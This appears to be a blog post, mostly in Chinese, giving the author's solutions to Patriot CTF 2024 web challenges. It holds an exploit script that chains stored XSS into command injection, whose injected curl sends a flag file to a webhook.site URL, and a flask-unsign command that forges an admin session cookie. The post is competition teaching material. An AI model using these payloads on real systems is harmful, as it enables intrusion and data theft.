<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before all這是我解的部分的writeup，因為本次解題量挺大，隊伍的可能要很晚出&#x3D;w&#x3D;Team: ICEDTEARank: 33&#x2F;1360跟冰茶一起打的，Web主要由我處理，整體而言題目不錯，不會難但有趣(?)第一次打Online CTF有cert &gt;w&lt;b已經開始期待下次大家一起打CTFㄌ，希望成績越來越好   Write UpWebOpen">
<meta property="og:type" content="article">
<meta property="og:title" content="Patriot CTF 2024 Write Up by Whale120">
<meta property="og:url" content="http://wha13.github.io/2024/09/21/patriotctf2024/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before all這是我解的部分的writeup，因為本次解題量挺大，隊伍的可能要很晚出&#x3D;w&#x3D;Team: ICEDTEARank: 33&#x2F;1360跟冰茶一起打的，Web主要由我處理，整體而言題目不錯，不會難但有趣(?)第一次打Online CTF有cert &gt;w&lt;b已經開始期待下次大家一起打CTFㄌ，希望成績越來越好   Write UpWebOpen">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/Hkq3G8xCC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkeDrlhpA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H19Mrhi6R.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryjhr3iTC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BkANW42T0.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkK-ceaTR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ryI-oMnpR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H1Nsfdn60.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S15jYqTa0.png">
<meta property="article:published_time" content="2024-09-21T15:51:20.000Z">
<meta property="article:modified_time" content="2024-09-24T14:59:58.637Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="ICEDTEA">
<meta property="article:tag" content="Apache">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/Hkq3G8xCC.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Patriot CTF 2024 Write Up by Whale120</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/01/20242222222/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/09/19/jailctf2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/09/21/patriotctf2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/09/21/patriotctf2024/&text=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/09/21/patriotctf2024/&is_video=false&description=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Patriot CTF 2024 Write Up by Whale120&body=Check out this article: http://wha13.github.io/2024/09/21/patriotctf2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/09/21/patriotctf2024/&name=Patriot CTF 2024 Write Up by Whale120&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/09/21/patriotctf2024/&t=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Open-Seasame"><span class="toc-number">3.1.</span> <span class="toc-text">Open Seasame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impersonate"><span class="toc-number">3.2.</span> <span class="toc-text">Impersonate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KIRAN-SAU-PROBLEM"><span class="toc-number">3.3.</span> <span class="toc-text">KIRAN SAU PROBLEM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dogdays"><span class="toc-number">3.4.</span> <span class="toc-text">dogdays</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blob"><span class="toc-number">3.5.</span> <span class="toc-text">Blob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-DOM"><span class="toc-number">3.6.</span> <span class="toc-text">DOM DOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#idk-cipher"><span class="toc-number">4.1.</span> <span class="toc-text">idk cipher</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">5.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Night-School"><span class="toc-number">5.1.</span> <span class="toc-text">Night School</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">6.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bad-Blood"><span class="toc-number">6.1.</span> <span class="toc-text">Bad Blood</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Dire-Situation"><span class="toc-number">6.2.</span> <span class="toc-text">A Dire Situation</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Patriot CTF 2024 Write Up by Whale120
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-21T15:51:20.000Z" class="dt-published" itemprop="datePublished">2024-09-21</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Apache/" rel="tag">Apache</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/ICEDTEA/" rel="tag">ICEDTEA</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是我解的部分的writeup，因為本次解題量挺大，隊伍的可能要很晚出&#x3D;w&#x3D;<br>Team: ICEDTEA<br>Rank: 33&#x2F;1360<br>跟冰茶一起打的，Web主要由我處理，整體而言題目不錯，不會難但有趣(?)<br>第一次打Online CTF有cert &gt;w&lt;b<br>已經開始期待下次大家一起打CTFㄌ，希望成績越來越好<br><img src="https://hackmd.io/_uploads/Hkq3G8xCC.png" alt="pctf-cert">  </p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Open-Seasame"><a href="#Open-Seasame" class="headerlink" title="Open Seasame"></a>Open Seasame</h3><ul>
<li>Solver: Whale120(wha13)</li>
</ul>
<p>一個bot介面（對外開在13336）跟一個web介面（<del>通靈出</del>對外開在13337）<br>bot介面長這樣，只能去造訪local 1337底下的路徑（會帶著admin的httponly cookie）<br><img src="https://hackmd.io/_uploads/SkeDrlhpA.png" alt="image"><br><strong>app.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> uuid, subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">SECRET = <span class="built_in">open</span>(<span class="string">&quot;secret.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">stats = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/stats/&lt;string:id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stats</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">for</span> stat <span class="keyword">in</span> stats:</span><br><span class="line">        <span class="keyword">if</span> stat[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">id</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(stat[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;error&quot;: &quot;Not found&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/stats&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_stats</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        high_score = <span class="built_in">int</span>(request.json[<span class="string">&#x27;high_score&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;error&quot;: &quot;Invalid request&quot;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">    stats.append(&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: [username, high_score]</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;success&quot;: &quot;Added&quot;, &quot;id&quot;: &quot;&#x27;</span>+<span class="built_in">id</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/cal&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cal</span>():</span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cookie == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> cookie != SECRET:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    modifier = request.args.get(<span class="string">&#x27;modifier&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;cal&quot;: &quot;&#x27;</span>+subprocess.getoutput(<span class="string">&quot;cal &quot;</span>+modifier)+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>觀察兩個洞：<br>XSS:去post<code>/api/stats</code>可以插資料，拿到的uuid可以去<code>/api/stats/&lt;uuid&gt;</code>請求獲得資料，然後資料直接輸出<br>Command Injection:<code>/api/cal</code>那邊，裸裸的subprocess.getoutput那段<br>Admin bot有個不能輸入cal這三個字母和不能輸入%的限制。<br>攻擊練：透過XSS admin帶著Command Injection Payload去fetch <code>/api/cal</code>  </p>
<p><strong>exp.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line">payload=<span class="string">b&#x27;fetch(\&#x27;http://127.0.0.1:1337/api/cal?modifier=2024 ; curl https://webhook.site/9ae03b9b-4d60-4062-8ce8-af02c23e1731 --data &quot;$(cat flag.txt)&quot;\&#x27;)&#x27;</span></span><br><span class="line">payload=<span class="string">f&quot;&lt;script&gt;eval(atob(&#x27;<span class="subst">&#123;b64.b64encode(payload).decode()&#125;</span>&#x27;))&lt;/script&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:payload, <span class="string">&#x27;high_score&#x27;</span>:<span class="string">&quot;1337&quot;</span>&#125;</span><br><span class="line">web=req.post(<span class="string">&#x27;http://chal.competitivecyber.club:13337/api/stats&#x27;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(web.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Flag: CACI{1_l0v3_c0mm4nd_1nj3ct10n}</p>
</blockquote>
<h3 id="Impersonate"><a href="#Impersonate" class="headerlink" title="Impersonate"></a>Impersonate</h3><ul>
<li>Solver: Whale120(wha13)<br><strong>app.py</strong>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify, abort, redirect, session</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">server_start_time = datetime.now()</span><br><span class="line">server_start_str = server_start_time.strftime(<span class="string">&#x27;%Y%m%d%H%M%S&#x27;</span>)</span><br><span class="line">secure_key = hashlib.sha256(<span class="string">f&#x27;secret_key_<span class="subst">&#123;server_start_str&#125;</span>&#x27;</span>.encode()).hexdigest()</span><br><span class="line">app.secret_key = secure_key</span><br><span class="line">app.config[<span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>] = timedelta(seconds=<span class="number">300</span>)</span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&quot;flag&#123;this_is_a_fake_flag&#125;&quot;</span>)</span><br><span class="line">secret = uuid.UUID(<span class="string">&#x27;31333337-1337-1337-1337-133713371337&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_username</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Check if the username is alphanumeric and less than 20 characters.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> username.isalnum() <span class="keyword">and</span> <span class="built_in">len</span>(username) &lt; <span class="number">20</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Handle the main page where the user submits their username.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.values[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.values[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_username(username):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&#x27;Invalid username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username.lower().startswith(<span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&#x27;Don\&#x27;t try to impersonate administrator!&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">        uid = uuid.uuid5(secret, username)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">        session[<span class="string">&#x27;uid&#x27;</span>] = <span class="built_in">str</span>(uid)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/user/<span class="subst">&#123;uid&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;uid&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_page</span>(<span class="params">uid</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Display the user&#x27;s session page based on their UUID.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uid = uuid.UUID(uid)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    session[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Welcome Guest! Sadly, you are not admin and cannot view the flag.&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Display the admin page if the user is an admin.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>) <span class="keyword">and</span> uuid.uuid5(secret, <span class="string">&#x27;administrator&#x27;</span>) <span class="keyword">and</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;administrator&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/status&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">status</span>():</span><br><span class="line">    current_time = datetime.now()</span><br><span class="line">    uptime = current_time - server_start_time</span><br><span class="line">    formatted_uptime = <span class="built_in">str</span>(uptime).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    formatted_current_time = current_time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">    status_content = <span class="string">f&quot;&quot;&quot;Server uptime: <span class="subst">&#123;formatted_uptime&#125;</span>&lt;br&gt;</span></span><br><span class="line"><span class="string">    Server time: <span class="subst">&#123;formatted_current_time&#125;</span></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> status_content</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9999</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
可以直接造訪<code>/status</code>獲得server time，然後用<code>flask-unsign</code>簽回去就好  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;is_admin&#x27;: True, &#x27;uid&#x27;: &#x27;31333337-1337-1337-1337-133713371337&#x27;, &#x27;username&#x27;: &#x27;administrator&#x27;&#125;&quot;</span> --secret <span class="string">&#x27;af9e55089a3a20273e06f6443ba96ebe4f2c62a827d895feb16487cfca62b2d7&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="KIRAN-SAU-PROBLEM"><a href="#KIRAN-SAU-PROBLEM" class="headerlink" title="KIRAN SAU PROBLEM"></a>KIRAN SAU PROBLEM</h3><ul>
<li>Solver: Whale120(wha13)</li>
</ul>
<p>一個Apache上面的php題目：<br><strong>Dockerfile</strong>  </p>
